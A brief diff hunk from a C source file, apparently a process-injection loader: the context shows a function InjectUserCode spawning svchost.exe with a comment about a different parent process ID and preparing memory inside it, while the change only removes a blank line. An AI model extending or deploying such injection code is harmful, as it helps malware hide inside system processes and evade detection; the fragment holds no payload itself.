@@ -265,7 +265,6 @@ BOOL InjectUserCode(CHAR* Bytes, SIZE_T Size)
         // TODO: spawn svchost.exe with a different ppid an jus start it running
         CreateProcessA("C:\\Windows\\system32\\svchost.exe", NULL, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sInfo, &pInfo);
 
-
         LPVOID rBuffer = NULL;
 
         // alloc the memory we need inside the process, TODO: syscall
